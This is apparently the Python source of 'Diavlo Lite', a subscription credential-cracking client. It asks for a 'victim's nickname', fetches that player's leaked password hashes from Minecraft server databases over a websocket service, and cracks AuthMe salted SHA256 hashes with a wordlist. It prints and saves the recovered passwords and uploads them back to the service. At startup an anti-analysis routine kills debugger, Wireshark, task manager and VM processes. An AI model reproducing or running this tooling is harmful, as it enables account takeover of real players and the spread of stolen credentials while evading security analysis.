import asyncio, colorama, shutil, os, time, hashlib, json, psutil
from colorama import Fore
from websockets import connect
from pwinput import pwinput
colorama.init()

ws = "ws://%WEBSOCKET HERE%"
logo = """
  _____  _             _         _      _ _       
 |  __ \(_)           | |       | |    (_) |      
 | |  | |_  __ ___   _| | ___   | |     _| |_ ___ 
 | |  | | |/ _` \ \ / / |/ _ \  | |    | | __/ _ \\
 | |__| | | (_| |\ V /| | (_) | | |____| | ||  __/
 |_____/|_|\__,_| \_/ |_|\___/  |______|_|\__\___|
"""

logo2 = """
██████╗ ██╗ █████╗ ██╗   ██╗██╗      ██████╗     ██╗     ██╗████████╗███████╗
██╔══██╗██║██╔══██╗██║   ██║██║     ██╔═══██╗    ██║     ██║╚══██╔══╝██╔════╝
██║  ██║██║███████║██║   ██║██║     ██║   ██║    ██║     ██║   ██║   █████╗  
██║  ██║██║██╔══██║╚██╗ ██╔╝██║     ██║   ██║    ██║     ██║   ██║   ██╔══╝  
██████╔╝██║██║  ██║ ╚████╔╝ ███████╗╚██████╔╝    ███████╗██║   ██║   ███████╗
╚═════╝ ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝ ╚═════╝     ╚══════╝╚═╝   ╚═╝   ╚══════╝
"""


# WS REQUESTS
# Example ws request -> asyncio.run(login("ws://%WEBSOCKET HERE%"))

async def ws_login(uri, user, passwd):
    async with connect(uri) as ws:
        await ws.send(f"LOGIN {user} {passwd}")
        return await ws.recv()

async def ws_getdata(uri, user, passwd):
    async with connect(uri) as ws:
        await ws.send(f"DATA {user} {passwd}")
        return await ws.recv()

async def ws_mcsearch(uri, user, passwd, nickname):
    async with connect(uri) as ws:
        await ws.send(f"MCSEARCH {user} {passwd} {nickname}")
        return await ws.recv()

async def ws_addpass(uri, user, passwd, hash, userpass):
    async with connect(uri) as ws:
        await ws.send(f"ADDPASS {user} {passwd} {hash} {userpass}")

# UTILITIES

def printcenter(s):
    tsize = shutil.get_terminal_size()
    for line in s.split("\n"):
        print(line.center(tsize.columns))

def centertext(s):
    a = shutil.get_terminal_size()
    for line in s.split("\n"):
        return line.center(a.columns)

def bruteforce(hash, salt):
    if len(hash) == 86: # SHA256 - AuthMe
        salt = hash.split("$")[2]
        hash = hash.split("$")[3]
        for word in words:
            nosalt = hashlib.sha256(word.encode()).hexdigest()
            withsalt = hashlib.sha256(nosalt.encode() + salt.encode()).hexdigest()
            if withsalt == hash:
                return word
    if len(hash) == 128: # SHA512 - DBA
        return
    return hash

def antidebug():
        procesos = [
            "httpdebuggerui",
            "wireshark",
            "fiddler",
            "regedit",
            "taskmgr",
            "pestudio",
            "vmwareuser",
            "vgauthservice",
            "vmacthlp",
            "x96dbg",
            "vmsrvc",
            "x32dbg",
            "vmusrvc"
        ]
        for proceso in psutil.process_iter():
            if proceso.name() in procesos:
                try:
                    proceso.kill()
                except: pass

# CODE

## Minecraft Searcher

def d_mc():
    os.system("cls || clear")
    print(Fore.RED, end="")
    printcenter(logo2)
    printcenter(f"{Fore.RED}Diavlo Minecraft Searcher")
    print()
    nick = input(f"{Fore.LIGHTBLUE_EX}[$] {Fore.CYAN}Insert your victim's nickname: {Fore.RESET}")
    wordlist = input(f"{Fore.LIGHTBLUE_EX}[$] {Fore.CYAN}Insert your wordlist file: {Fore.RESET}")
    if not os.path.isfile(wordlist):
        print(Fore.RED+"Wordlist not found.")
        time.sleep(3)
        d_mc()
    else:
        global words
        words=[]
        os.system("cls || clear")
        print(Fore.YELLOW, end="")
        printcenter("""
╔═══════════════════════════════════╗
║                                   ║
║ Loading wordlist... Please wait.  ║
║                                   ║
╚═══════════════════════════════════╝""")
        with open(wordlist, 'r', encoding="latin-1") as f:
            lines = f.readlines()
            for line in lines:
                line = line.replace('\n', '')
                words.append(line)
        print(Fore.GREEN, end="")
        printcenter("Wordlist loaded sucessfully! Searching data from this user...")
        dbdata = asyncio.run(ws_mcsearch(ws, user, pwd, nick))
        if dbdata == "NOTHING":
            print(Fore.RED, end="")
            printcenter("There was no data found from this user. Returning to the main menu.")
            time.sleep(3)
            main()
        else:
            dbdata = dbdata.split("&&&")
            for line in dbdata:
                if not (line == ""):
                    server = line.split(" ")[0]
                    line = line.replace("'", '"')
                    results = []
                    print(Fore.RED)
                    printcenter(f"Found {nick}@{server}. Cracking...")
                    print(Fore.GREEN)
                    hash = json.loads(line.replace(server+" ", ""))['password']
                    realpass = bruteforce(hash.replace('\n', ''), "Salt with hash")
                    if not (realpass == hash.replace('\n', '')):
                        printcenter("» Server: "+server)
                        printcenter("» Username: "+nick)
                        printcenter("» Password: "+realpass)
                        asyncio.run(ws_addpass(ws, user, pwd, hash, realpass))
                        results.append(f"{server};{realpass}")
                    else:
                        printcenter("» Server: "+server)
                        printcenter("» Username: "+nick)
                        printcenter("» Password: "+realpass)
            print(Fore.RED)
            printcenter("Finished searching data.")
            save = input("Do you want to save the results? ")
            if (save.lower() == "yes" or save.lower() == "y" or save.lower() == "s" or save.lower() == "si" or save.lower() == "oui"):
                with open('results-diavlo-'+nick+".txt", 'w') as f:
                    f.write('=========================\n')
                    f.write('Results from Diavlo Lite\n')
                    f.write(f'User: {nick}\n')
                    f.write('=========================\n')
                    for a in results:
                        a = a.split(';')
                        f.write(f'Server: {a[0]}\n')
                        f.write(f'Password: {a[1]}\n')
                        f.write('=========================\n')
                print(Fore.GREEN+'Data saved sucessfully. Going to the main menu in 3 seconds...')
                time.sleep(3)
                main()
            else:
                printcenter("Going back to the main menu in 3 seconds...")
                time.sleep(3)
                main()

## MAIN

def main():
    os.system("cls || clear")
    # GET DATA
    rankprefix = ""
    data = asyncio.run(ws_getdata(ws, user, pwd)).split('\n')
    for a in data:
        a = a.replace('\n', '').split()
        if a[0] == "RANK":
            rankinfo = a[1].lower().split('-')
            rank = rankinfo[0]
            if rankinfo[1] == "extended":
                rankprefix += f" {Fore.CYAN}[EXTENDED]"
            if rank == "admin":
                rankprefix += f" {Fore.RED}[{Fore.LIGHTRED_EX}ADMIN{Fore.RED}]"
            if rank == "staff":
                rankprefix += f" {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}STAFF{Fore.YELLOW}]"
        elif a[0] == "TIMELEFT":
            timeleft = a[1]
    # GET DATA
    print()
    printcenter(Fore.RED+logo2)
    print()
    print(f"                                       {Fore.LIGHTBLUE_EX}Welcome back{rankprefix} {user}, {Fore.LIGHTBLUE_EX}you got {Fore.BLUE}{timeleft}{Fore.LIGHTBLUE_EX} days left.")
    print()
    printcenter(f"{Fore.BLUE}1) {Fore.CYAN}Minecraft Searcher")
    printcenter(f"{Fore.BLUE}2) {Fore.CYAN}Settings")
    printcenter(f"{Fore.BLUE}3) {Fore.CYAN}Exit")
    print()
    option = input(f"{Fore.LIGHTRED_EX}[»] {Fore.RED}Select an option: {Fore.RESET}")
    if option == "1":
        d_mc()
    elif option == "2":
        d_settings()
    elif option == "3":
        print(f"{Fore.GREEN}Exiting in 3 seconds...")
        time.sleep(3)
        exit()
    else:
        print(f"{Fore.RED}Invalid option.")
        time.sleep(3)
        main()

## LOGIN

antidebug()
os.system("cls || clear")
print(Fore.RED)
printcenter(logo)
printcenter("Insert your credentials.")
print()
print(f"{Fore.RED}[»] {Fore.LIGHTBLUE_EX}Insert your username: {Fore.RESET}", end="")
user = input("")
print(f"{Fore.RED}[»] {Fore.LIGHTBLUE_EX}Insert your password: {Fore.RESET}", end="")
pwd = pwinput("")
try:
    if asyncio.run(ws_login(ws, user, pwd)) == "AUTHORIZED":
        print(Fore.GREEN+"Sucessfully authorized.")
        time.sleep(3)
        main()
    else:
        print(Fore.RED+"Invalid credentials.")
        time.sleep(3)
        exit()
except Exception as e:
    print(e)
    print(Fore.RED+"Our servers could be down. Please try again in another moment.")
